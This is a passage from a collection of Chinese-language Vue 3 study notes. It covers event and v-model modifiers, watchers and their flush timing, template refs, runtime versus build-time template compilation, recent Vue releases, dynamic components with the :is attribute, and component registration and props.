修饰符允许精确控制触发==事件所需的系统修饰符组合==\n\t\t- `鼠标按键修饰符`用于处理特定鼠标按键触发的事件\n\t\t   - 比如 `.left.right.middle` \n\n> `passive` 是一个事件监听器选项，它告诉浏览器监听器不会调用 `preventDefault() `来阻止默认的滚动行为，可用于改善滚动性能\n\n```javascript\nwindow.addEventListener('scroll', function(event) {\n    // 处理滚动事件\n}, { passive: true });\n```\n\n## 9. 表单输入绑定\n\n- `v-model 指令`简化了表单输入与 JavaScript 变量的同步\n\t- `v-model` 支持多种表单元素，包括文本输入、复选框、单选按钮和选择器。比如\n\t- 文本类型的` <input>` 和 `<textarea>` 元素会绑定 `value property` 并侦听` input 事件`；\n\t- `<input type=\"checkbox\">` 和 `<input type=\"radio\">` 会绑定 `checked property `并侦听 `change 事件`；\n\t- `<select> `会绑定 `value property `并侦听 `change` 事件\n\t- `v-model` 会忽略任何表单元素上初始的 `value`、`checked` 或 `selected` attribute\n\t- `v-model` 可以与`修饰符`一起使用，如` .lazy、.number 和 .trim`，以实现不同的输入管理方式\n\t- `.lazy`：在 `change` 事件后同步更新而不是 `input`\n\t- 除了`内置表单`外，可以在组件中使用 `v-model` 来创建具有`自定义行为`的可复用输入组件\n\n相对小众的一个用法：\n\n```vue hl:4\n<input\n  type=\"checkbox\"\n  v-model=\"toggle\"\n  :true-value=\"'选中了'\"\n  :false-value=\"'未选中'\" />\n```\n\n## 10. 生命周期\n\n![image.png|688](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/ecf5a16d3c2229d12c040cb757da8714.png)\n\n## 11. 侦听器\n\n### 11.1. watch \n\n```javascript hl:6,13,32,33,18\n// 侦听单个来源\nfunction watch<T>(\n  source: WatchSource<T>,\n  callback: WatchCallback<T>,\n  options?: WatchOptions\n): StopHandle\n\n// 侦听多个来源\nfunction watch<T>(\n  sources: WatchSource<T>[],\n  callback: WatchCallback<T[]>,\n  options?: WatchOptions\n): StopHandle\n\ntype WatchCallback<T> = (\n  value: T,\n  oldValue: T,\n  onCleanup: (cleanupFn: () => void) => void\n) => void\n\ntype WatchSource<T> =\n  | Ref<T> // ref\n  | (() => T) // getter\n  | T extends object\n  ? T\n  : never // 响应式对象\n\ninterface WatchOptions extends WatchEffectOptions {\n  immediate?: boolean // 默认：false\n  deep?: boolean // 默认：false\n  flush?: 'pre' | 'post' | 'sync' // 默认：'pre'\n  onTrack?: (event: DebuggerEvent) => void\n  onTrigger?: (event: DebuggerEvent) => void\n  once?: boolean // 默认：false (3.4+)\n}\n```\n\n### 11.2. watchEffect()\n\n```javascript\nfunction watchEffect(\n  effect: (onCleanup: OnCleanup) => void,\n  options?: WatchEffectOptions\n): StopHandle\n\ntype OnCleanup = (cleanupFn: () => void) => void\n\ninterface WatchEffectOptions {\n  flush?: 'pre' | 'post' | 'sync' // 默认：'pre'\n  onTrack?: (event: DebuggerEvent) => void\n  onTrigger?: (event: DebuggerEvent) => void\n}\n\ntype StopHandle = () => void\n```\n\n### 11.3. 几个注意点\n\n1、`watch` 的 `第一个参数` 都建议写成`箭头函数`\n\n2、注意 `watch` 的 `第二个参数` 有 `once` 、`immediate` ， `deep`\n- 但需要注意 `deep = true 时` 可能会引起性能问题\n\n3、 [watchEffect函数](https://cn.vuejs.org/api/reactivity-core.html#watcheffect) 会**自动收集并追踪**函数内所依赖的响应式数据，省得手动维护所需要监听的数据，他不需要像 `watch` 一样递归地跟踪所有的属性，比较适合侦听一个嵌套数据结构中的`几个属性`。\n\n4、回调的触发时机\n\n（1）`flush：pre`默认情况下，侦听器回调会在`父组件更新之后、所属组件的 DOM 更新之前`被调用，这意味着如果你尝试在侦听器回调中访问所属组件的 DOM，那么 DOM 将处于更新前的状态\n\n- 能够避免不必要的渲染\n- 大多数情况下这是最优选择\n- 考虑使用 `pre` 模式配合 `nextTick`\n\n```javascript\nconst count = ref(0)\n\n// 在组件更新前触发\nwatch(count, (newValue, oldValue) => {\n  console.log('count changed:', newValue)\n}, { flush: 'pre' })\n\nfunction update() {\n  count.value++\n}\n\n// 执行顺序：\n// 1. count 值更新\n// 2. 触发 watch 回调\n// 3. 组件重新渲染\n\n```\n\n（2）可以通过设置`flush: 'post'`选项在侦听器回调中访问被 Vue 更新之后的 DOM。\n\n- 需要访问更新后的 DOM\n- 需要确保某些 DOM 操作在渲染后执行\n\n```javascript\nconst count = ref(0)\n\n// 在组件更新后触发\nwatch(count, (newValue, oldValue) => {\n  // 此时可以访问更新后的 DOM\n  console.log('DOM updated, count is:', newValue)\n}, { flush: 'post' })\n\nfunction update() {\n  count.value++\n}\n\n// 执行顺序：\n// 1. count 值更新\n// 2. 组件重新渲染\n// 3. 触发 watch 回调\n\n```\n\n（3）可以设置 `flush: 'sync'` 创建一个`同步触发的侦听器`，它会在 Vue 进行任何更新之前触发\n\n- 可能影响性能\n- 只在特定场景下使用（如**调试**）\n- 处理高频更新时要特别注意\n\n```javascript\nconst count = ref(0)\n\n// 同步触发，立即执行\nwatch(count, (newValue, oldValue) => {\n  console.log('count immediately changed:', newValue)\n}, { flush: 'sync' })\n\nfunction update() {\n  count.value++\n  count.value++\n  count.value++\n  // 每次改变都会立即触发 watch\n}\n\n// 执行顺序：\n// 值改变立即触发 watch，不等待下一个 tick\n```\n\n（4）同步侦听器不会进行**批处理**，每当检测到响应式数据发生变化时就会触发。可以使用它来监视简单的布尔值，但应避免在可能多次同步修改的数据源 (如数组) 上使用\n\n5、停止侦听器\n\n（1）**宿主组件卸载时自动停止，但异步回调里则不会**\n\n```javascript hl:9\n<script setup>\nimport { watchEffect } from 'vue'\n\n// 它会自动停止\nwatchEffect(() => {})\n\n// ...这个则不会！\nsetTimeout(() => {\n  watchEffect(() => {})\n}, 100)\n</script>\n```\n\n> 需要`异步创建`侦听器的情况很少，请尽可能选择`同步创建`。如果需要等待一些异步数据，你可以使用**条件式的侦听逻辑**\n\n（2）手动停止一个侦听器，请调用 `watch` 或 `watchEffect` 返回的函数\n\n```javascript\nconst unwatch = watchEffect(() => {})\n\n// ...当该侦听器不再需要时\nunwatch()\n```\n\n## 12. 模板引用\n\n1、使用 `ref attribute` 来引用 DOM ，如 `<input ref=\"input\"> `\n\n2、在组件挂载后 `onMounted` 中，使用 `ref` ,不然可能为 `null` ；或者 `watch ` 不为空时，也能正常获取到 DOM\n\n3、`v-for` 中的模板引用，`<li v-for=\"item in list\" ref=\"itemRefs\">` ， 其中 `const itemRefs = ref([]) `\n\n4、函数模板引用： `<input :ref=\"(el) => { /* 将 el 赋值给一个数据属性或 ref 变量 */ }\">`\n\n5、组件上的 `ref` ： `<Child ref=\"child\" />`，而后就可以通过 `child` 获取组件 `Child` 的实例，但访问`组件实例`的属性或方法需要通过 `defineExpose` 暴露出来，原因如下：\n\n6、使用了 `<script setup>` 的组件是默认私有的：一个父组件无法访问到一个使用了 `<script setup> `的子组件中的任何东西，除非子组件在其中通过 `defineExpose 宏` **显式暴露**\n\n>  这个和 React 也很像\n","H7sMNdI0":"\n# Vue3 的模板编译也可以发生在运行时\n\n`#vue3` \n\n\n## 目录\n<!-- toc -->\n ## R1 \n\nVue3 的模板编译**通常是在构建时完成的，而不是运行时**，但不是绝对的，我们可以打包==两个版本Vue==\n- runtime-only：\n\t- 仅包含运行时，体积更小，当然性能也更好\n- runtime + compiler：\n\t- 包含**编译器代码**，体积更大，当然性能也更好\n\n\n>  之前做个 markdown 嵌入 vue组件时，就使用过构建时，将 markdown → html → 特定 vdom → 特定的vue组件 → 渲染\n\n> \n\n## 2. **构建时编译（推荐）**\n\n```js\n// 单文件组件 (.vue)\n<template>\n  <div>{{ message }}</div>\n</template>\n\n// 会在构建时被编译成\nimport { createVNode, toDisplayString } from 'vue'\n\nexport function render(_ctx, _cache) {\n  return createVNode(\"div\", null, toDisplayString(_ctx.message))\n}\n```\n\n## 3. **运行时编译（不推荐）**\n\n```js\n// main.js\nimport { createApp } from 'vue/dist/vue.esm-bundler.js' // 包含运行时编译器的版本\n\ncreateApp({\n  template: `<div>{{ message }}</div>` // 这种情况会在运行时编译\n}).mount('#app')\n```\n\n## 4. **两种版本的区别**\n\n```js\n// 1. 仅运行时版本（推荐，体积更小）\nimport { createApp } from 'vue' // 约 14kb gzipped\n\n// 2. 完整版本（包含编译器，体积更大）\nimport { createApp } from 'vue/dist/vue.esm-bundler.js' // 约 23kb gzipped\n```\n\n## 5. **开发环境配置**\n\n```js hl:5\n// vite.config.js\nexport default {\n  resolve: {\n    alias: {\n      'vue': 'vue/dist/vue.runtime.esm-bundler.js' // 使用仅运行时版本\n    }\n  }\n}\n```\n\n## 6. **性能对比**\n\n```js hl:1,11,14\n// 1. 构建时编译（更好的性能）\n<script setup>\nimport { ref } from 'vue'\nconst count = ref(0)\n</script>\n\n<template>\n  <button @click=\"count++\">{{ count }}</button>\n</template>\n\n// 2. 运行时编译（需要额外的编译开销）\nconst app = createApp({\n  template: `\n    <button @click=\"count++\">{{ count }}</button>\n  `,\n  setup() {\n    const count = ref(0)\n    return { count }\n  }\n})\n```\n\n## 7. **特殊场景**：动态模板 和 动态渲染\n\n```js hl:7\n// 1. 动态模板（需要运行时编译）\nconst DynamicComponent = {\n  props: ['template'],\n  render() {\n    const { h } = Vue\n    if (this.template) {\n      // 不推荐：这种情况需要运行时编译\n      return h({\n        template: this.template,\n        data() {\n          return this.$props\n        }\n      })\n    }\n    return h('div', 'No template provided')\n  }\n}\n\n// 2. 推荐的动态渲染方式\nconst DynamicComponent = {\n  props: ['content'],\n  render() {\n    // 使用渲染函数或 JSX\n    return h('div', this.content)\n  }\n}\n```\n\n## 8. **编译优化**\n\n```js\n// 构建时编译可以进行的优化\n<template>\n  <div>Static Content</div>\n  <div>{{ dynamic }}</div>\n</template>\n\n// 编译后\nexport function render(_ctx, _cache) {\n  return (_openBlock(), _createElementBlock(_Fragment, null, [\n    _createElementVNode(\"div\", null, \"Static Content\", -1 /* HOISTED */),\n    _createElementVNode(\"div\", null, _toDisplayString(_ctx.dynamic), 1 /* TEXT */)\n  ], 64 /* STABLE_FRAGMENT */))\n}\n```\n\n## 9. 总结\n\n- **默认情况**：\n\t- Vue3 默认在构建时完成模板编译\n\t- 使用 Vite 或 webpack 等构建工具时自动处理\n- **性能考虑**：\n\t- 构建时编译可以减少运行时开销\n\t- 减少最终包的体积\n\t- 允许更多的编译时优化\n- **不同版本**：\n\t- runtime-only：仅包含运行时，体积更小\n\t- runtime + compiler：包含**编译器**，体积更大\n- **最佳实践**：\n\t- 尽可能使用单文件组件（.vue）\n\t- 避免运行时编译\n\t- 特殊场景下才考虑使用完整版本\n- **例外情况**：\n\t- 需要动态编译模板的场景\n\t- 不使用构建工具的简单项目\n\t- 特殊的开发需求\n\n","U2k4R2gl":"\n# Vue3  生态最新动态\n\n`#vue3` \n\n\n## 目录\n<!-- toc -->\n ## 1. R1 \n\n- V3.5\n\t- 无虚拟 DOM 的编译策略\n\t- watch 的 deep 可以指定`具体层级`\n\n\n## 2. Vue 3.5 版本发布\n\n- Vue 3.5 已于2024年9月发布\n- 在 Vue 3.5 中，`watch` 函数的深度监听功能得到了增强。\n\t- 之前的 `deep` 属性是一个布尔值，而现在可以指定监听的层级\n- Vue3.5的`模板解析器`重构，内存占用减少了 56%\n\t- **据说响应式也重构了**\n- 生成类似于 React 的 `useId`\n\n## 3. Vapor 模式开发\n\n- Vapor 模式是 Vue 3 推出的一种`无虚拟DOM`的编译策略\n- Vapor 模式将只支持 Vue 的一部分功能\n\n### 3.1. 还是 受 solid.js 的影响吧\n\n- 没有虚拟DOM，直接操作真实DOM\n- Solid 是一个用于制作交互式 Web 应用程序的 JavaScript 框架。\n\t- 它利用自定义编译器将 JSX 转换为高性能的 DOM 操作。更新则由细粒度的响应式系统提供支持，响应式系统减少了对比差异的开销，从而获得最佳性能\n- Solid 的性能表型\n\t- ![图片&文件](./files/20241102.png)\n\n### 3.2. Vue 3.x 主要版本\n\n#### 3.2.1. Vue 3.4 (2023年12月)\n\n- **性能优化**\n\t- 编译器性能提升约 2 倍\n\t- 运行时性能优化\n- **新特性**\n\t- 改进的 defineModel 宏\n\t- v-model 支持多个参数\n\t- 更好的 TypeScript 支持\n- **推荐同时更新**\n\t- Volar / vue-tsc\n\t- @vitejs/plugin-vue\n\t- @vue/language-server\n\n#### 3.2.2. Vue 3.3 (2023年5月)\n\n- **开发体验改进**\n\t- 改进的类型推断\n\t- defineEmits 宏的类型检查增强\n\t- defineProps 宏的默认值类型推断\n- **新功能**\n\t- defineOptions 宏\n\t- defineSlots 宏\n\t- 通用组件支持 \n\n#### 3.2.3. Vue 3.2 (2021年8月)\n\n- **性能优化**\n\t- 更快的 diff 算法\n\t- 更高效的 ref 实现\n- **新特性**\n\t- `<script setup>` 正式发布\n\t- CSS v-bind\n\t- 响应式转换的改进\n\n\n","OZt8zyjK":"\n# Vue3 中 is 属性的使用方法和应用场景\n\n`#vue3` `#R1` \n\n> 它为**动态组件渲染**提供了强大而灵活的支持\n>  一定需要配合 `component` 使用\n>  注意 📢 `import` 关键词的一些用法，特别是动态的场景\n\n\n## 目录\n<!-- toc -->\n ## 1. 基本用法 \n\n### 1.1. 动态组件\n\n```vue\n<template>\n  <!-- 使用 is 动态切换组件 -->\n  <component :is=\"currentComponent\" />\n</template>\n\n<script>\nimport ComponentA from './ComponentA.vue'\nimport ComponentB from './ComponentB.vue'\n\nexport default {\n  components: {\n    ComponentA,\n    ComponentB\n  },\n  data() {\n    return {\n      currentComponent: 'ComponentA'\n    }\n  }\n}\n</script>\n```\n\n### 1.2. 在 `setup` 语法糖中使用\n\n```vue hl:10\n<template>\n  <component :is=\"activeComponent\" />\n</template>\n\n<script setup>\nimport { ref, markRaw } from 'vue'\nimport ComponentA from './ComponentA.vue'\nimport ComponentB from './ComponentB.vue'\n\n// 使用 markRaw 避免不必要的响应式包装\nconst activeComponent = ref(markRaw(ComponentA))\n\n// 切换组件\nconst switchComponent = () => {\n  activeComponent.value = markRaw(ComponentB)\n}\n</script>\n```\n\n#### 1.2.1. 附：markRaw\n\n`markRaw` 是 Vue 3 中的一个工具函数，**用于标记一个对象，使其永远不会被转换为响应式对象**。使用好处是：\n1. 提高应用性能\n2. 减少不必要的响应式转换\n3. 更好地处理第三方库集成\n4. 优化内存使用\n\n```javascript hl:9\nimport { markRaw, reactive } from 'vue'\n\n// 普通对象会被转换为响应式\nconst foo = reactive({ count: 1 })\n\n// 使用 markRaw 标记的对象将保持原始状态\nconst bar = markRaw({ count: 1 })\nconst reactiveBar = reactive(bar)\n// reactiveBar 仍然是非响应式的\n```\n\n>  再次 reactive 包装也是无响应式的\n\n## 2. DOM 内置元素\n\n### 2.1. 动态渲染不同的 HTML 元素\n\n```vue hl:14,18\n<template>\n  <!-- 动态切换元素类型 -->\n  <component \n    :is=\"tag\" \n    :class=\"elementClass\"\n  >\n    内容\n  </component>\n</template>\n\n<script setup>\nimport { ref } from 'vue'\n\nconst tag = ref('div')\n\n// 可以动态切换为其他 HTML 元素\nconst changeToButton = () => {\n  tag.value = 'button'\n}\n</script>\n```\n\n### 2.2. 处理受限制的元素\n\n- 保证 `tr/td` 一定包裹在 `tbody` 里面\n\n```vue hl:3\n<template>\n  <table>\n    <component :is=\"'tbody'\">\n      <tr>\n        <td>表格内容</td>\n      </tr>\n    </component>\n  </table>\n</template>\n```\n\n## 3. 内置组件渲染\n\n### 3.1. 渲染内置组件\n\n```vue hl:2\n<template>\n  <component :is=\"'transition'\">\n    <div v-if=\"show\">过渡内容</div>\n  </component>\n</template>\n\n<script setup>\nimport { ref } from 'vue'\n\nconst show = ref(false)\n</script>\n```\n\n### 3.2. 结合 keep-alive 使用\n\n```vue hl:2\n<template>\n  <keep-alive>\n    <component :is=\"currentTab\" />\n  </keep-alive>\n</template>\n\n<script setup>\nimport { ref } from 'vue'\nimport TabA from './TabA.vue'\nimport TabB from './TabB.vue'\n\nconst currentTab = ref('TabA')\n</script>\n```\n\n## 4. 高级用法\n\n### 4.1. 异步组件\n\n```vue hl:2,8\n<template>\n  <component :is=\"asyncComponent\" />\n</template>\n\n<script setup>\nimport { defineAsyncComponent, ref } from 'vue'\n\nconst asyncComponent = ref(defineAsyncComponent(() => \n  import('./HeavyComponent.vue')\n))\n</script>\n```\n\n### 4.2. 配合 v-bind 使用\n\n```vue hl:4\n<template>\n  <component \n    :is=\"componentName\"\n    v-bind=\"componentProps\"\n  />\n</template>\n\n<script setup>\nimport { ref } from 'vue'\n\nconst componentName = ref('CustomButton')\nconst componentProps = ref({\n  type: 'primary',\n  size: 'large',\n  onClick: () => console.log('clicked')\n})\n</script>\n```\n\n## 5. 实际应用场景\n\n### 5.1. 表单控件渲染器\n\n```vue\n<template>\n  <form>\n    <div v-for=\"field in formFields\" :key=\"field.id\">\n      <component\n        :is=\"getFieldComponent(field.type)\"\n        v-model=\"formData[field.name]\"\n        v-bind=\"field.props\"\n      />\n    </div>\n  </form>\n</template>\n\n<script setup>\nimport { ref } from 'vue'\nimport InputText from './fields/InputText.vue'\nimport InputNumber from './fields/InputNumber.vue'\nimport SelectField from './fields/Select.vue'\n\nconst formData = ref({})\nconst formFields = ref([\n  { id: 1, type: 'text', name: 'username', props: { label: '用户名' } },\n  { id: 2, type: 'number', name: 'age', props: { label: '年龄' } },\n  { id: 3, type: 'select', name: 'role', props: { label: '角色', options: [] } }\n])\n\nconst componentMap = {\n  text: InputText,\n  number: InputNumber,\n  select: SelectField\n}\n\nconst getFieldComponent = (type) => componentMap[type]\n</script>\n```\n\n### 5.2. 标签页系统\n\n```vue\n<template>\n  <div class=\"tabs\">\n    <div class=\"tab-headers\">\n      <button \n        v-for=\"tab in tabs\" \n        :key=\"tab.name\"\n        @click=\"activeTab = tab.name\"\n        :class=\"{ active: activeTab === tab.name }\"\n      >\n        {{ tab.label }}\n      </button>\n    </div>\n    \n    <keep-alive>\n      <component :is=\"currentTabComponent\" />\n    </keep-alive>\n  </div>\n</template>\n\n<script setup>\nimport { ref, computed } from 'vue'\nimport TabHome from './tabs/Home.vue'\nimport TabProfile from './tabs/Profile.vue'\nimport TabSettings from './tabs/Settings.vue'\n\nconst tabs = [\n  { name: 'TabHome', label: '首页', component: TabHome },\n  { name: 'TabProfile', label: '个人', component: TabProfile },\n  { name: 'TabSettings', label: '设置', component: TabSettings }\n]\n\nconst activeTab = ref('TabHome')\n\nconst currentTabComponent = computed(() => {\n  const tab = tabs.find(t => t.name === activeTab.value)\n  return tab ? tab.component : null\n})\n</script>\n```\n\n## 6. 注意事项\n\n### 6.1. **命名规范**：\n\n- 字符串 `‘div’`\n- 或者 变量 `MyComponent`\n\n```vue hl:3,6\n<template>\n  <!-- DOM 标签使用字符串 -->\n  <component :is=\"'div'\" />\n  \n  <!-- 组件使用 PascalCase 命名 -->\n  <component :is=\"MyComponent\" />\n</template>\n```\n\n### 6.2. **性能优化**：\n\n```vue hl:4\n<script setup>\nimport { markRaw } from 'vue'\n\n// 使用 markRaw 避免不必要的响应式转换\nconst components = {\n  foo: markRaw(FooComponent),\n  bar: markRaw(BarComponent)\n}\n</script>\n```\n\n### 6.3. **动态组件的生命周期**：忽略，不支持了\n\n```vue hl:3\n<template>\n  <keep-alive>\n    <component :is=\"currentComponent\" @hook:mounted=\"onComponentMounted\" />\n  </keep-alive>\n</template>\n```\n\n>  疑问❓：没这么用过，确定可以？\n\n> 这种写法在 Vue 3 中已经不再支持了。\n\n### 6.4. **Props 传递**：\n\n```vue hl:\n<template>\n  <component \n    :is=\"componentName\"\n    v-bind=\"$attrs\"\n    @custom-event=\"handleEvent\"\n  />\n</template>\n```\n\n## 7. 在 Vue 2 和 Vue 3 中监听动态组件生命周期\n\n### 7.1. Vue 2 中的写法（已废弃）\n\n```vue\n<!-- Vue 2 中的 @hook 写法 -->\n<component \n  :is=\"currentComponent\" \n  @hook:mounted=\"onComponentMounted\"\n  @hook:updated=\"onComponentUpdated\"\n/>\n```\n\n### 7.2. Vue 3 中的正确写法\n\n#### 7.2.1. 使用 onMounted 在父组件中监听\n\n```vue hl:12,19\n<template>\n  <component :is=\"currentComponent\" ref=\"dynamicComponent\" />\n</template>\n\n<script setup>\nimport { ref, onMounted, watch } from 'vue'\n\nconst currentComponent = ref('ComponentA')\nconst dynamicComponent = ref(null)\n\n// 监听组件变化\nwatch(() => currentComponent.value, () => {\n  // 组件变化后的处理\n  nextTick(() => {\n    console.log('组件已更新')\n  })\n})\n\n// 在父组件中监听挂载\nonMounted(() => {\n  console.log('动态组件已挂载')\n})\n</script>\n```\n\n#### 7.2.2. 通过事件通信：自定义事件通讯\n\n父组件 \n\n```vue\n<!-- 父组件 -->\n<template>\n  <component \n    :is=\"currentComponent\"\n    @component-mounted=\"handleChildMounted\"\n    @component-updated=\"handleChildUpdated\"\n  />\n</template>\n\n<script setup>\nimport { ref } from 'vue'\n\nconst currentComponent = ref('ComponentA')\n\nconst handleChildMounted = () => {\n  console.log('子组件已挂载')\n}\n\nconst handleChildUpdated = () => {\n  console.log('子组件已更新')\n}\n</script>\n```\n\n子组件\n\n```javascript\n<!-- 子组件 -->\n<script setup>\nimport { onMounted, onUpdated } from 'vue'\n\nconst emit = defineEmits(['component-mounted', 'component-updated'])\n\nonMounted(() => {\n  emit('component-mounted')\n})\n\nonUpdated(() => {\n  emit('component-updated')\n})\n</script>\n```\n\n#### 7.2.3. 使用 provide/inject\n\n父组件\n\n```vue hl:12\n<!-- 父组件 -->\n<template>\n  <component :is=\"currentComponent\" />\n</template>\n\n<script setup>\nimport { ref, provide } from 'vue'\n\nconst currentComponent = ref('ComponentA')\n\n// 提供生命周期回调\nprovide('lifecycleHooks', {\n  onMounted: () => {\n    console.log('子组件已挂载')\n  },\n  onUpdated: () => {\n    console.log('子组件已更新')\n  }\n})\n</script>\n\n```\n\n子组件\n\n```html\n\n<!-- 子组件 -->\n<script setup>\nimport { onMounted, onUpdated, inject } from 'vue'\n\nconst { onMounted: parentOnMounted, onUpdated: parentOnUpdated } = \n  inject('lifecycleHooks', {})\n\nonMounted(() => {\n  parentOnMounted?.()\n})\n\nonUpdated(() => {\n  parentOnUpdated?.()\n})\n</script>\n```\n\n#### 7.2.4. 使用组合式函数（Composables）\n\n```js hl:1,4\n<!-- useComponentLifecycle.js -->\nimport { ref } from 'vue'\n\nexport function useComponentLifecycle() {\n  const isComponentMounted = ref(false)\n  const isComponentUpdated = ref(false)\n\n  const setMounted = () => {\n    isComponentMounted.value = true\n  }\n\n  const setUpdated = () => {\n    isComponentUpdated.value = true\n  }\n\n  return {\n    isComponentMounted,\n    isComponentUpdated,\n    setMounted,\n    setUpdated\n  }\n}\n\n<!-- 父组件 -->\n<template>\n  <component :is=\"currentComponent\" />\n</template>\n\n<script setup>\nimport { ref, watch } from 'vue'\nimport { useComponentLifecycle } from './useComponentLifecycle'\n\nconst currentComponent = ref('ComponentA')\nconst { isComponentMounted, isComponentUpdated } = useComponentLifecycle()\n\nwatch(isComponentMounted, (newValue) => {\n  if (newValue) {\n    console.log('组件已挂载')\n  }\n})\n\nwatch(isComponentUpdated, (newValue) => {\n  if (newValue) {\n    console.log('组件已更新')\n  }\n})\n</script>\n```\n\n#### 7.2.5. 在动态组件中使用异步组件\n\n```vue\n<template>\n  <Suspense>\n    <template `#default>`\n      <component :is=\"currentComponent\" />\n    </template>\n    <template `#fallback>`\n      <div>加载中...</div>\n    </template>\n  </Suspense>\n</template>\n\n<script setup>\nimport { ref, defineAsyncComponent } from 'vue'\n\nconst ComponentA = defineAsyncComponent(() => import('./ComponentA.vue'))\nconst currentComponent = ref(ComponentA)\n\n\n</script>\n```\n\n## 8. 需要配合 import 关键词\n\n>  更多详见 [32. vite 之 import 关键词](/post/VRabtZlK.html)","6kXxwVKQ":"\n# Vue3 组件\n\n`#vue3` `#前端框架/vue` `#R1` \n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n- Suspense 是 Vue 的一个内置组件，用于**协调组件树中的异步依赖关系**\n\n## 1. 基础\n\n![image.png|632](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/158cdda6d2da00692729eb12f32de205.png)\n\n### 1.1. 定义\n\n定义：使用 `SFC` 或者 `特定JavaScript 对象`\n\n![image.png|696](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/b3751bcb2ed0be8d12f1ebf08cf1fc8e.png)\n\n> 内联模板字符串时，必须这样：`<script type=\"text/x-template\">`\n\n### 1.2. 使用组件\n\n使用组件：`<script setup>` 中，导入的组件都在模板中直接可用，或全局注册组件都不需要导入\n\n### 1.3. 传递 props\n\n`<script setup>` 中 使用 `const props = defineProps(['title'])` 定义\n\n```javascript\nexport default {\n  props: ['title'],\n  setup(props) {\n    console.log(props.title)\n  }\n}\n```\n\n### 1.4. 定义事件\n\n`<script setup>` 中 使用 `const emit = defineEmits(['enlarge-text'])` 定义\n\n```javascript\nexport default {\n  emits: ['enlarge-text'],\n  setup(props, ctx) {\n    ctx.emit('enlarge-text')\n  }\n}\n```\n\n### 1.5. 插槽\n\n像 HTML 元素一样向`组件`中传递内容\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/e51ef16990a2a7456969b2eb98fbcd62.png)\n\n### 1.6. 动态组件\n\n即使用 `<component>`  \n\n```vue\n<!-- currentTab 改变时组件也改变 -->\n<component :is=\"tabs[currentTab]\"></component>\n```\n\n> 被切换掉的组件会被`卸载` ，可使用 `KeepAlive` 强制`存活`\n\n### 1.7. `:is` 的用法\n\n> 更多详见 [4. Vue3 中 is 属性的使用方法和应用场景](/post/OZt8zyjK.html)\n\n元素位置限制如何解决？ 比如 `li` 必须在 `ul` 里，`tr` 必须在 `table`里\n\n举例：\n\n```vue\n<table>\n  <blog-post-row></blog-post-row>\n</table>\n```\n\n解决方案：\n\n```vue hl:2ß\n<table>\n  <tr is=\"vue:blog-post-row\"></tr>\n</table>\n```\n\n--- \n又比如，保证 `tr/td` 一定包裹在 `tbody` 里面\n\n```vue hl:3\n<template>\n  <table>\n    <component :is=\"'tbody'\">\n      <tr>\n        <td>表格内容</td>\n      </tr>\n    </component>\n  </table>\n</template>\n```\n\n> 更多用法详见 [4. Vue3 中 is 属性的使用方法和应用场景](/post/OZt8zyjK.html)\n\n## 2. 注册组件\n\n### 2.1. 全局注册\n\n即应用内任何地方都可以直接使用 `<ComponentA/>`\n\n```js\nimport { createApp } from 'vue'\n\nconst app = createApp({})\n\napp.component(\n  // 注册的名字\n  'MyComponent',\n  // 组件的实现\n  {\n    /* ... */\n  }\n)\n\n// 链式调用  \napp\n.component('ComponentA', ComponentA)\n.component('ComponentB', ComponentB)\n.component('ComponentC', ComponentC)\n```\n\n#### 2.1.1. 全局注册的问题\n\n1. 不能被 `tree-shaking` ，会导致 js 包过大\n2. 和使用过多的`全局变量`一样，太多`全局注册的组件`可能会影响应用长期的可维护性\n\n### 2.2. 局部注册\n\n（1）使用 `<script setup>`，**导入的组件可以直接在模板中使用，无需注册**\n\n（2）不使用`<script setup>`， 则需要使用` components 选项` 来`显式注册\n`\n（3）局部注册的组件在`后代组件`中不可用，即只在当前组件可用\n\n### 2.3. 组件命名和使用命名\n\n`组件定义命名`和`组件使用命名`：比如 `MyComponent` 为名注册的组件，在模板中可以通过 `<MyComponent>` 或 `<my-component>` ，建议使用 PascalCase 命名，因为：\n- ① `PascalCase` 这样的组件定义在 IDE 中友好\n- ② `PascalCase` 格式的一看就是 `Vue 组件`，\n\t- 很容易和`自定义元素 (web components)` 区分开来\n\n## 3. Props 定义\n\n1、`props` 可以使用 `defineProps()` 宏来声明\n\n（1）` <script setup>` ： `const props = defineProps(['foo'])`\n\n（2）不使用`setup` ，使用 `props` 选项声明\n\n--- \n\n2、使用一个对象绑定多个 `prop`，如下示例：\n\n```typescript hl:6\nconst post = {\n  id: 1,\n  title: 'My Journey with Vue'\n}\n  \n`<BlogPost v-bind=\"post\" />`\n\n//******************=======>  等价于\n`<BlogPost :id=\"post.id\" :title=\"post.title\" />`\n```\n\n---\n\n3、`props` 可以是静态值或动态绑定的值\n\n（1）`静态` 即 `:key=1`\n\n（2）`动态`即`:key={post.title}`\n\n4、所有的 `props` 都遵循着`单向绑定原则`，避免子组件修改父组件的状态。 否则数据流将很容易变得混乱而难以理解，更改一个 prop 的需求通常来源于以下几种场景\n\n（1）prop 被用于传入`初始值`\n\n```javascript hl:4\nconst props = defineProps(['initialCounter'])\n\n// 计数器只是将 props.initialCounter 作为初始值\n// 像下面这样做就使 prop 和后续更新无关了\nconst counter = ref(props.initialCounter)\n```\n\n（2）需要对传入的` prop 值`做进一步的转换，建议使用 `computed`\n\n（3）更改`对象 / 数组类型`的 `props`，仅在父子组件在设计上本来就需要`紧密耦合`，不然**子组件不允许直接修改**，否则都推荐子组件抛出一个`事件`来通知父组件做出改变，即都回到父组件修改\n\n> 虽然：因为是引用类型，阻止这种更改不现实，但是，还是尽量按照上面的约定实践\n\n---\n\n5、Prop 校验\n\n```javascript\ndefineProps({\n  // 基础类型检查\n  // （给出 `null` 和 `undefined` 值则会跳过任何类型检查）\n  propA: Number,\n  // 多种可能的类型\n  propB: [String, Number],\n  // 必传，且为 String 类型\n  propC: {\n    type: String,\n    required: true\n  },\n  // 必传但可为空的字符串\n  propD: {\n    type: [String, null],\n    required: true\n  },\n  // Number 类型的默认值\n  propE: {\n    type: Number,\n    default: 100\n  },\n  // 对象类型的默认值\n  propF: {\n    type: Object,\n    // 对象或数组的默认值\n    // 必须从一个工厂函数返回。\n    // 该函数接收组件所接收到的原始 prop 作为参数。\n    default(rawProps) {\n      return { message: 'hello' }\n    }\n  },\n  // 自定义类型校验函数\n  // 在 3.4+ 中完整的 props 作为第二个参数传入\n  propG: {\n    validator(value, props) {\n      // The value must match one of these strings\n      return ['success', 'warning', 